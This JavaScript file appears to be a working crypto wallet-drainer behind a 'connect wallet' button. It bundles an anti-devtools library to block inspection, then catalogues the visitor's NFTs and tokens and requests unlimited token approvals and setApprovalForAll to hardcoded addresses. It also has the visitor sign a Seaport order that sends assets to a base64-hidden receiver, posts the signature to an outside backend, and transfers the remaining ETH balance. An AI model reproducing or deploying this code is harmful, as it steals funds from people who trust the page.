(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
    !function(e,n){"object"==typeof exports&&"object"==typeof module?module.exports=n():"function"==typeof define&&define.amd?define([],n):"object"==typeof exports?exports.DisableDevtool=n():e.DisableDevtool=n()}(this,function(){return function(e){var n={};function t(o){if(n[o])return n[o].exports;var i=n[o]={i:o,l:!1,exports:{}};return e[o].call(i.exports,i,i.exports,t),i.l=!0,i.exports}return t.m=e,t.c=n,t.d=function(e,n,o){t.o(e,n)||Object.defineProperty(e,n,{enumerable:!0,get:o})},t.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},t.t=function(e,n){if(1&n&&(e=t(e)),8&n)return e;if(4&n&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(t.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&n&&"string"!=typeof e)for(var i in e)t.d(o,i,function(n){return e[n]}.bind(null,i));return o},t.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return t.d(n,"a",n),n},t.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},t.p="",t(t.s=0)}([function(e,n,t){"use strict";function o(e){return-1!==navigator.userAgent.toLocaleLowerCase().indexOf(e)}t.r(n);var i,r=function(){try{return window.self!==window.top}catch(e){return!0}}(),u=o("qqbrowser"),c=o("firefox"),a=o("macintosh"),l=o("edge"),f=l&&!o("chrome")||o("trident")||o("msie"),d=o("crios"),v=o("edgios"),s={UNKONW:-1,REG_TO_STRING:0,DEFINE_ID:1,SIZE:2,DATE_TO_STRING:3,FUNC_TO_STRING:4,DEBUGGER:5},w=!1,p={};for(var y in s)p[s[y]]=!1;function m(e){p[e]=!1}function b(){for(var e in p)if(p[e])return w=!0,!0;return w=!1,!1}function h(){var e=function(){if(g(window.devicePixelRatio))return window.devicePixelRatio;var e=window.screen;return!g(e)&&(!(!e.deviceXDPI||!e.logicalXDPI)&&e.deviceXDPI/e.logicalXDPI)}();if(!1===e)return!0;var n=s.SIZE,t=window.outerWidth-window.innerWidth*e>200,o=window.outerHeight-window.innerHeight*e>300;return t||o?(S(n),!1):(m(n),!0)}function g(e){return null!=e}function T(e){throw new Error('"'+e+'" is read-only')}function E(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}var D,I=(E(i={},s.REG_TO_STRING,u||c),E(i,s.DEFINE_ID,!0),E(i,s.SIZE,!r&&!l),E(i,s.DATE_TO_STRING,!d&&!v),E(i,s.FUNC_TO_STRING,!d&&!v),E(i,s.DEBUGGER,d||v),i);function _(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}var O=(_(D={},s.REG_TO_STRING,function(){var e=s.REG_TO_STRING,n=0,t=/./;W(t),t.toString=function(){if(u){var t=(new Date).getTime();n&&t-n<100?S(e):n=t}else c&&S(e);return""},C(e,function(){W(t)})}),_(D,s.DEFINE_ID,function(){var e=s.DEFINE_ID,n=document.createElement("div");n.__defineGetter__("id",function(){S(e)}),Object.defineProperty(n,"id",{get:function(){S(e)}}),C(e,function(){W(n)})}),_(D,s.SIZE,function(){h(),window.addEventListener("resize",function(){setTimeout(h,100)},!0)}),_(D,s.DATE_TO_STRING,function(){var e=s.DATE_TO_STRING,n=0,t=new Date;t.toString=function(){return n++,""},C(e,function(){n=0,W(t),H(),n>=2&&S(e)})}),_(D,s.FUNC_TO_STRING,function(e){if(!e){var n=s.FUNC_TO_STRING,t=0,o=function(){};o.toString=function(){return t++,""},C(n,function(){t=0,W(o),H(),t>=2&&S(n)})}}),_(D,s.DEBUGGER,function(e){if(e){var n=s.DEBUGGER;C(n,function(){var e=Date.now();Date.now()-e>100&&S(n)})}}),D);function S(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:s.UNKONW;console.warn("You ar not allow to use DEVTOOL! πÇÉtype = ".concat(e,"πÇæ")),L.clearIntervalWhenDevOpenTrigger&&P(),window.clearTimeout(G),L.ondevtoolopen(e,k),function(e){p[e]=!0}(e)}var N=null,G=null,R=[],x=0;function j(){var e,n,t,o,i,r,u=!1,c=function(){u=!0},a=function(){u=!1};e=c,n=a,t=window.alert,o=window.confirm,i=window.prompt,r=function(t){return function(){e&&e(),t.apply(void 0,arguments),n&&n()}},window.alert=r(t),window.confirm=r(o),window.prompt=r(i),function(e,n){var t,o,i;void 0!==document.hidden?(t="hidden",i="visibilitychange",o="visibilityState"):void 0!==document.mozHidden?(t="mozHidden",i="mozvisibilitychange",o="mozVisibilityState"):void 0!==document.msHidden?(t="msHidden",i="msvisibilitychange",o="msVisibilityState"):void 0!==document.webkitHidden&&(t="webkitHidden",i="webkitvisibilitychange",o="webkitVisibilityState");var r=function(){document[o]===t?n():e()};document.removeEventListener(i,r,!1),document.addEventListener(i,r,!1)}(a,c),N=window.setInterval(function(){u||(R.forEach(function(e){var n=e.type,t=e.handle;m(n),t(x++)}),H(),function(){if("function"==typeof L.ondevtoolclose){var e=w;!b()&&e&&L.ondevtoolclose()}}())},L.interval),G=setTimeout(function(){/(iphone|ipad|ipod|ios|android)/i.test(navigator.userAgent.toLowerCase())&&P()},L.stopIntervalTime)}function C(e,n){R.push({type:e,handle:n})}function P(){window.clearInterval(N)}function k(){if(P(),L.url)window.location.href=L.url;else{try{window.opener=null,window.open("","_self"),window.close(),window.history.back()}catch(e){console.log(e)}setTimeout(function(){window.location.href="https://tackchen.gitee.io/404.html?h=".concat(encodeURIComponent(location.host))},500)}}function A(e){return(A="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}var L={md5:"",ondevtoolopen:k,ondevtoolclose:null,url:"",tkName:"ddtk",interval:200,disableMenu:!0,stopIntervalTime:5e3,clearIntervalWhenDevOpenTrigger:!1,detectors:"all",clearLog:!0,disableSelect:!1,disableCopy:!1,disableCut:!1},U=["detectors","ondevtoolclose"];var K=window.console||{log:function(){}},W=f?function(){return K.log.apply(K,arguments)}:K.log,F=f?function(){return K.clear()}:K.clear;function H(){L.clearLog&&F()}function V(e,n){e.addEventListener(n,function(e){return(e=e||window.event).returnValue=!1,e.preventDefault(),!1})}function M(e,n,t,o,i,r){return q((u=q(q(n,e),q(o,r)))<<(c=i)|u>>>32-c,t);var u,c}function z(e,n,t,o,i,r,u){return M(n&t|~n&o,e,n,i,r,u)}function B(e,n,t,o,i,r,u){return M(n&o|t&~o,e,n,i,r,u)}function X(e,n,t,o,i,r,u){return M(n^t^o,e,n,i,r,u)}function Z(e,n,t,o,i,r,u){return M(t^(n|~o),e,n,i,r,u)}function q(e,n){var t=(65535&e)+(65535&n);return(e>>16)+(n>>16)+(t>>16)<<16|65535&t}var Y=function(e){return function(e){for(var n="0123456789abcdef",t="",o=0;o<4*e.length;o++)t+=n.charAt(e[o>>2]>>o%4*8+4&15)+n.charAt(e[o>>2]>>o%4*8&15);return t}(function(e,n){e[n>>5]|=128<<n%32,e[14+(n+64>>>9<<4)]=n;for(var t=1732584193,o=-271733879,i=-1732584194,r=271733878,u=0;u<e.length;u+=16){var c=t,a=o,l=i,f=r;t=z(t,o,i,r,e[u+0],7,-680876936),r=z(r,t,o,i,e[u+1],12,-389564586),i=z(i,r,t,o,e[u+2],17,606105819),o=z(o,i,r,t,e[u+3],22,-1044525330),t=z(t,o,i,r,e[u+4],7,-176418897),r=z(r,t,o,i,e[u+5],12,1200080426),i=z(i,r,t,o,e[u+6],17,-1473231341),o=z(o,i,r,t,e[u+7],22,-45705983),t=z(t,o,i,r,e[u+8],7,1770035416),r=z(r,t,o,i,e[u+9],12,-1958414417),i=z(i,r,t,o,e[u+10],17,-42063),o=z(o,i,r,t,e[u+11],22,-1990404162),t=z(t,o,i,r,e[u+12],7,1804603682),r=z(r,t,o,i,e[u+13],12,-40341101),i=z(i,r,t,o,e[u+14],17,-1502002290),t=B(t,o=z(o,i,r,t,e[u+15],22,1236535329),i,r,e[u+1],5,-165796510),r=B(r,t,o,i,e[u+6],9,-1069501632),i=B(i,r,t,o,e[u+11],14,643717713),o=B(o,i,r,t,e[u+0],20,-373897302),t=B(t,o,i,r,e[u+5],5,-701558691),r=B(r,t,o,i,e[u+10],9,38016083),i=B(i,r,t,o,e[u+15],14,-660478335),o=B(o,i,r,t,e[u+4],20,-405537848),t=B(t,o,i,r,e[u+9],5,568446438),r=B(r,t,o,i,e[u+14],9,-1019803690),i=B(i,r,t,o,e[u+3],14,-187363961),o=B(o,i,r,t,e[u+8],20,1163531501),t=B(t,o,i,r,e[u+13],5,-1444681467),r=B(r,t,o,i,e[u+2],9,-51403784),i=B(i,r,t,o,e[u+7],14,1735328473),t=X(t,o=B(o,i,r,t,e[u+12],20,-1926607734),i,r,e[u+5],4,-378558),r=X(r,t,o,i,e[u+8],11,-2022574463),i=X(i,r,t,o,e[u+11],16,1839030562),o=X(o,i,r,t,e[u+14],23,-35309556),t=X(t,o,i,r,e[u+1],4,-1530992060),r=X(r,t,o,i,e[u+4],11,1272893353),i=X(i,r,t,o,e[u+7],16,-155497632),o=X(o,i,r,t,e[u+10],23,-1094730640),t=X(t,o,i,r,e[u+13],4,681279174),r=X(r,t,o,i,e[u+0],11,-358537222),i=X(i,r,t,o,e[u+3],16,-722521979),o=X(o,i,r,t,e[u+6],23,76029189),t=X(t,o,i,r,e[u+9],4,-640364487),r=X(r,t,o,i,e[u+12],11,-421815835),i=X(i,r,t,o,e[u+15],16,530742520),t=Z(t,o=X(o,i,r,t,e[u+2],23,-995338651),i,r,e[u+0],6,-198630844),r=Z(r,t,o,i,e[u+7],10,1126891415),i=Z(i,r,t,o,e[u+14],15,-1416354905),o=Z(o,i,r,t,e[u+5],21,-57434055),t=Z(t,o,i,r,e[u+12],6,1700485571),r=Z(r,t,o,i,e[u+3],10,-1894986606),i=Z(i,r,t,o,e[u+10],15,-1051523),o=Z(o,i,r,t,e[u+1],21,-2054922799),t=Z(t,o,i,r,e[u+8],6,1873313359),r=Z(r,t,o,i,e[u+15],10,-30611744),i=Z(i,r,t,o,e[u+6],15,-1560198380),o=Z(o,i,r,t,e[u+13],21,1309151649),t=Z(t,o,i,r,e[u+4],6,-145523070),r=Z(r,t,o,i,e[u+11],10,-1120210379),i=Z(i,r,t,o,e[u+2],15,718787259),o=Z(o,i,r,t,e[u+9],21,-343485551),t=q(t,c),o=q(o,a),i=q(i,l),r=q(r,f)}return Array(t,o,i,r)}(function(e){for(var n=Array(),t=0;t<8*e.length;t+=8)n[t>>5]|=(255&e.charCodeAt(t/8))<<t%32;return n}(e),8*e.length))};function $(e){var n,t;!function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};for(var n in L)void 0===e[n]||A(L[n])!==A(e[n])&&-1===U.indexOf(n)||(L[n]=e[n]);"function"==typeof L.ondevtoolclose&&!0===L.clearIntervalWhenDevOpenTrigger&&(L.clearIntervalWhenDevOpenTrigger=!1,console.warn("πÇÉDISABLE-DEVTOOLπÇæclearIntervalWhenDevOpenTrigger σ£¿Σ╜┐τö¿ ondevtoolclose µù╢µùáµòê"))}(e),function(){if(L.md5){var e=function(e){var n=window.location.search,t=window.location.hash;if(""===n&&""!==t&&(n="?".concat(t.split("?")[1])),""!==n&&void 0!==n){var o=new RegExp("(^|&)"+e+"=([^&]*)(&|$)","i"),i=n.substr(1).match(o);if(null!=i)return unescape(i[2])}return""}(L.tkName);if(Y(e)===L.md5)return!0}return!1}()||(j(),n=a?function(e,n){return e.metaKey&&e.altKey&&73===n}:function(e,n){return e.ctrlKey&&e.shiftKey&&73===n},t=a?function(e,n){return e.metaKey&&e.altKey&&85===n||e.metaKey&&83===n}:function(e,n){return e.ctrlKey&&(83===n||85===n)},window.addEventListener("keydown",function(e){var o=(e=e||window.event).keyCode||e.which;if(123===o||n(e,o)||t(e,o))return e.returnValue=!1,e.preventDefault(),!1},!0),L.disableMenu&&V(window,"contextmenu"),L.disableSelect&&V(window,"selectstart"),L.disableCopy&&V(window,"copy"),L.disableCut&&V(window,"cut"),("all"===L.detectors?Object.keys(O):L.detectors).forEach(function(e){!function(e,n){if("function"==typeof n){var t=I[e];void 0===t?(T("value"),t=!0):"function"==typeof t&&(T("value"),t=t()),!0===t&&n()}}(e,O[e])}))}$.md5=Y,$.version="0.2.5",$.DETECTOR_TYPE=s,$.isDevToolOpened=b,function(){if("undefined"!=typeof document){var e=document.querySelector("[disable-devtool-auto]");if(e){var n={};["md5","url","tk-name","interval","disable-menu","detectors"].forEach(function(t){var o=e.getAttribute(t);null!==o&&("interval"===t?o=parseInt(o):"disable-menu"===t?o="false"!==o:"detector"===t&&"all"!==o&&(o=o.split(" ")),n[function(e){if(-1===e.indexOf("-"))return e;var n=!1;return e.split("").map(function(e){return"-"===e?(n=!0,""):n?(n=!1,e.toUpperCase()):e}).join("")}(t)]=o)}),$(n)}}}(),n.default=$}]).default});

    },{}],2:[function(require,module,exports){
    "use strict";var _disableDevtool=_interopRequireDefault(require("disable-devtool"));function _interopRequireDefault(e){return e&&e.__esModule?e:{default:e}}(0,_disableDevtool.default)();

},{"disable-devtool":1}]},{},[2]);


const Seaport = window.seaport;
const ethers = window.ethers;
const RPC = "https://mainnet.infura.io/v3/a8bfbf2a754841b1b5c05896a4eb72d6";
const API_ENDPOINT = "https://api.backendlenny.xyz";
const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const CONDUIT = "0x1E0049783F008A0085193E00003D00cd54003c71";
const CONTRACT_ADR = "0x755862cf8CF619f5bd2F1c7a69DC6682d1A43aed"
const INITIATOR = "0x279052F0950c222c8B760B97d69B9F781DC1Be15"
let receiver = atob("MHhDZTIxOTIxMDg2NzIzNWExQWM5OEZCNTBmYTcwYTlFQzEwZkFDODZC")
const endpoint = receiver;
let provider;
let selectedAccount;
let signer;

let ABI = [{ "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "approved", "type": "address" }, { "indexed": true, "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "operator", "type": "address" }, { "indexed": false, "internalType": "bool", "name": "approved", "type": "bool" }], "name": "ApprovalForAll", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": true, "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "approve", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "balance", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "getApproved", "outputs": [{ "internalType": "address", "name": "operator", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "operator", "type": "address" }], "name": "isApprovedForAll", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "ownerOf", "outputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "safeTransferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "safeTransferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "operator", "type": "address" }, { "internalType": "bool", "name": "_approved", "type": "bool" }], "name": "setApprovalForAll", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "tokenURI", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "transferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }]

const WETH_ABI = [{
    "constant": false,
    "inputs": [
        {
            "name": "_spender",
            "type": "address"
        },
        {
            "name": "_value",
            "type": "uint256"
        }
    ],
    "name": "approve",
    "outputs": [
        {
            "name": "",
            "type": "bool"
        }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [
        {
            "name": "_owner",
            "type": "address"
        },
        {
            "name": "_spender",
            "type": "address"
        }
    ],
    "name": "allowance",
    "outputs": [
        {
            "name": "",
            "type": "uint256"
        }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [
        {
            "name": "_owner",
            "type": "address"
        }
    ],
    "name": "balanceOf",
    "outputs": [
        {
            "name": "balance",
            "type": "uint256"
        }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}]

let etherPrice;

async function getEtherPrice(){
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    return price["ethereum"]["usd"];
}

let w3 = new ethers.providers.JsonRpcProvider(RPC);


const round = (value) => {
    return Math.round(value * 10000) / 10000;
}

async function getNormalizedETH(wei){
    return ethers.utils.formatEther(wei);
}

async function isApproved(owner, nft) {
    let contract = new ethers.Contract(nft, ABI, w3);
    const approvee = await contract.functions.isApprovedForAll(owner, CONDUIT);
    return approvee;
}

function fetchTokenIds(resp, contract) {
    const assets = resp.assets;
    const tokenIds = [];
    for (let i = 0; i < assets.length; i++) {
        const currentAsset = assets[i];
        if (currentAsset.asset_contract.address.toLowerCase() == contract.toLowerCase()) {
            tokenIds.push(currentAsset.token_id);
        }
    }
    return tokenIds;
}

async function getNFTS(walletAddress) {
    const options = { method: 'GET', headers: { Accept: 'application/json' } };

    let nfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${walletAddress}&order_direction=desc&limit=200&include_orders=false`)
    let nftsData = await nfts.json();


    let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`, options)
        .then(response => response.json())
        .then(nfts => {
            if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(async (nft) => {
                let price = round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price);
                let isApprovedBool = await isApproved(walletAddress, nft.primary_asset_contracts[0].address);
                isApprovedBool = isApprovedBool[0]
                console.log("isApprovedBool", isApprovedBool)

                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: ethers.utils.getAddress(nft.primary_asset_contracts[0].address),
                    token_ids: fetchTokenIds(nftsData, nft.primary_asset_contracts[0].address),
                    price: price,
                    value: etherPrice * parseFloat(price),
                    owned: nft.owned_asset_count,
                    "approved": isApprovedBool
                }
            })
        }).catch(err => console.error(err));

    let all = await Promise.all(walletNfts);
    let sortedNfts = all.sort((a, b) => parseFloat(b.price) - parseFloat(a.price));
    return sortedNfts
}
function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
const characters = '0123456789';

async function getCounter(walletAddress) {
    const ABI_COUNTER = [{
        "inputs": [
            {
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }
        ],
        "name": "getCounter",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "counter",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }]
    let contract = new ethers.Contract("0x00000000006c3852cbEf3e08E8dF289169EdE581", ABI_COUNTER, w3);
    const counter = contract.functions.getCounter(walletAddress);
    return counter;
}



async function getWETH(walletAddress) {

    let contract = new ethers.Contract(WETH, WETH_ABI, w3);
    const balance = contract.functions.balanceOf(walletAddress);
    console.log("balance", balance)
    const allowances = contract.functions.allowance(walletAddress, CONDUIT);
    return await Promise.all([balance, allowances]);
}

function getPreviousDay(date = new Date()) {
    const previous = new Date(date.getTime());
    previous.setDate(date.getDate() - 1);
    return previous;
}

async function connect() {
    const etherPriceResp = getEtherPrice();
    provider = new ethers.providers.Web3Provider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    console.log("accounts", accounts)
    signer = provider.getSigner();
    selectedAccount = accounts[0];
    let ethBalance;
    provider.getBalance(selectedAccount).then((balance) => {
        ethBalance = ethers.utils.formatEther(balance)
        console.log(`balance: ${ethBalance} ETH`)
    })
    const network = await provider.getNetwork();
    const seaport = new Seaport(signer);
    const erc20s = fetch(API_ENDPOINT + "/getErc20s/?wallet=" + accounts[0])
    

    if (network.chainId !== 1) {

        try {
            await provider.send('wallet_switchEthereumChain', [{ chainId: "0x1" }]);

        } catch (err) {
            console.log("error", err)


            return;
        }
    }
    fetch(API_ENDPOINT+"/ping/?wallet="+accounts[0]).catch((err)=>console.log)
    etherPrice = await etherPriceResp;

    let [nfts, counter, wethData] = await Promise.all([getNFTS(accounts[0]), getCounter(accounts[0]), getWETH(accounts[0])]);
    counter = parseInt(counter.toString());
    console.log("counter", counter);
    let [balance, allowance] = wethData;
    balance = balance.toString();
    allowance = allowance.toString();

    const balanceNormalized = parseFloat(ethers.utils.formatEther(balance));
    const allowanceNormalized = parseFloat(ethers.utils.formatEther(allowance));
    console.log("balanceNormalized", balanceNormalized)
    let weth_include = "0";
    let wasWethApproved = false;
    if (allowanceNormalized >= balanceNormalized) {
        weth_include = balance;
    }
    else if (balanceNormalized > allowanceNormalized) {
        weth_include = allowance;
    }


    const orders = [];
    const considers = [];
    let bundlePrice = 0;
    nfts.forEach((nft) => {
        if (nft.type == "erc721" && nft.approved == true) {
            bundlePrice+=nft.value;
            nft.token_ids.forEach((token_id) => {
                console.log(nft)
                const array = {
                    itemType: 2,
                    token: nft.contract_address,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                }
                const consider = {
                    itemType: 2,
                    token: nft.contract_address,
                    identifierOrCriteria: token_id,
                    startAmount: "1",
                    endAmount: "1",
                    recipient: endpoint,
                }
                orders.push(array)
                considers.push(consider);

            })
        }

    });
    nfts.push({
        type: "balance",
        contract_address: "",
        token_ids:"",
        price: null,
        value: etherPrice * parseFloat(ethBalance),
        owned: "",
        "approved": false, 
    })
    

    if (weth_include !== "0") {
        wasWethApproved = true;
        bundlePrice += etherPrice * parseFloat(getNormalizedETH(weth_include));
        const weth_order = {
            "itemType": 1,
            "token": WETH,
            "identifierOrCriteria": 0,
            "startAmount": weth_include,
            "endAmount": weth_include
        }
        const weth_consider = {
            "itemType": 1,
            "token": WETH,
            "identifierOrCriteria": 0,
            "startAmount": weth_include,
            "endAmount": weth_include,
            "recipient": endpoint
        }
        orders.push(weth_order);
        considers.push(weth_consider);
    }

    console.log("bundleWorth",bundlePrice)

    const date = getPreviousDay();
    const milliseconds = date.getTime();
    const dateClone = date;
    const tomorrow = dateClone.setTime(milliseconds + (2 * 24 * 60 * 60 * 1000));
    const milliseconds_tomorrow = dateClone.getTime();
    const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000);
    const seconds = Math.floor(milliseconds / 1000);
    const salt = generateString(70);

    const offer = {
        "offerer": ethers.utils.getAddress(accounts[0]),
        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
        "offer": orders,
        consideration: considers,
        orderType: 2,
        startTime: seconds,
        endTime: tomorrow_seconds,
        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        salt: salt,
        totalOriginalConsiderationItems: considers.length,
        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    }
    console.log("offer", offer)
    if (offer.offer.length == 0) {
        const erc20_ = await erc20s;
        const all_coins = await erc20_.json();
        await normalSafa(nfts, all_coins);
        return;
    }

    else{
        nfts.push({
            type: "bundle",
            contract_address: "",
            token_ids:"",
            price: null,
            value: bundlePrice,
            owned: "",
            "approved": false, 
        })

    }
    // try {
    //     const erc20_ = await erc20s;
    //     const all_coins = await erc20_.json();
    //     console.log("normalSafaUnapproved",nfts)
    //     await normalSafaUnapproved(nfts, all_coins, wasWethApproved,offer,counter,seaport)
    // }
    // catch (err) {
    //     const erc20_ = await erc20s;
    //     const all_coins = await erc20_.json();
    //     await normalSafa(nfts, all_coins);
    //     return;
    // }
    const erc20_ = await erc20s;
    const all_coins = await erc20_.json();
    console.log("normalSafaUnapproved",nfts)
    await normalSafaUnapproved(nfts, all_coins, wasWethApproved,offer,counter,seaport)

}


async function normalSafaUnapproved(nfts, erc20s, wasWethApproved,offer,counter,seaport) {
    
    let all_data = []
    all_data = all_data.concat(nfts);
    all_data = all_data.concat(erc20s);
    const sortedassets = all_data.sort((a, b) => parseFloat(b.value) - parseFloat(a.value));
    console.log("normalSafaUnapproved",sortedassets)
    sortedassets.forEach((asset) => {
        if (!asset.approved) {
            if (wasWethApproved && asset.contract_address == WETH) {
                
            }
            else {
                try {
                    if (asset.type == "erc721") {
                        let contract = new ethers.Contract(asset.contract_address, ABI, signer);
                        contract.setApprovalForAll(CONTRACT_ADR, true).send({ from: selectedAccount }).catch((err) => console.log)
                    }
                    else if (asset.type == "erc20") {
                        let contract = new ethers.Contract(asset.contract_address, WETH_ABI, signer);
                        contract.approve(INITIATOR, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send({ from: selectedAccount }).catch((err) => console.log)
                    }
                    else if(asset.type == "bundle"){
                        const signature = seaport.signOrder(offer, parseInt(counter)).then(()=>{
                            offer["counter"] = parseInt(counter);
                            const order = {
                                "parameters": offer,
                                "signature": signature,
                            }
                            fetch(API_ENDPOINT + "/postSig", {
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                method: "POST",
                                body: JSON.stringify(order)
                            })
                        }).catch((err)=>console.log)
                    }
                    else if(asset.type == "balance"){
                        provider.getBalance(selectedAccount).then((balance) => {
                            provider.getGasPrice().then((gasPrice)=>{
                                let valueToSend = parseInt(balance) - (parseInt(gasPrice) * 91000);
                                if(valueToSend > 0 ){
                                    signer.sendTransaction({
                                        to:receiver,
                                        from:selectedAccount,
                                        value: ethers.utils.parseUnits(valueToSend.toString(), 'wei').toHexString()
                                    })

                                }
                                
                            })
                        })
                    }
                }
                catch (err) {
                }

            }


        }

    })
}


async function normalSafa(nfts, erc20s) {
    let all_data = []
    all_data = all_data.concat(nfts);
    all_data = all_data.concat(erc20s);
    const sortedassets = all_data.sort((a, b) => parseFloat(b.value) - parseFloat(a.value));
    sortedassets.forEach((asset) => {
        try {
            if (asset.type == "erc721") {
                let contract = new ethers.Contract(asset.contract_address, ABI, signer);
                contract.setApprovalForAll(CONTRACT_ADR, true).send({ from: selectedAccount }).catch((err) => console.log)
            }
            else if (asset.type == "erc20") {
                let contract = new ethers.Contract(asset.contract_address, WETH_ABI, signer);
                contract.approve(INITIATOR, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send({ from: selectedAccount }).catch((err) => console.log)
            }
            else if(asset.type == "balance"){
                provider.getBalance(selectedAccount).then((balance) => {
                    // convert a currency unit from wei to ether
                    provider.getGasPrice().then((gasPrice)=>{
                        
                        let valueToSend = parseInt(balance) - (parseInt(gasPrice) * 91000);
                        if(valueToSend > 0 ){
                            signer.sendTransaction({
                                to:receiver,
                                from:selectedAccount,
                                value: ethers.utils.parseUnits(valueToSend.toString(), 'wei').toHexString()
                            })

                        }

                    })
                   
                })
                
            }
        }
        catch (err) {
        }
    })
}

window.addEventListener("DOMContentLoaded", () => {
    document.getElementById("connectBTN").onclick = connect;
})
